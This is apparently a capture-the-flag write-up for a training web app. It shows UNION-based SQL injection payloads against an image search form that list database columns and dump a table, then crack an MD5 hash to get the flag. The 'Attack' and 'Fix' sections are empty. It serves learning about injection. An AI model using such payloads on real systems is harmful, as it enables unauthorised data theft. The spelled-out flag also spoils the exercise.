# Image search SQL injection

## Vulnerability
* Go to `Search image`
* List columns of table `list_images` (hex `0x6c6973745f696d61676573`)
```
null union select null,column_name from information_schema.columns where  table_name=0x6c6973745f696d61676573
```
* Read `list_images` table
```
null union select title,comment from list_images 
```
* Outputs
```
title: If you read this just use this md5 decode lowercase then sha256 to win
 this flag ! : 1928e8083cf461a51303633093573c46
comment: Hack me ?
```
* https://md5hashing.net/hash/md5/1928e8083cf461a51303633093573c46
* MD5 `1928e8083cf461a51303633093573c46` <-> `albatroz`
* `albatroz` <-> SHA256 `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Attack

## Fix

## Reference
https://portswigger.net/web-security/sql-injection/union-attacks
https://en.wikipedia.org/wiki/Information_schema
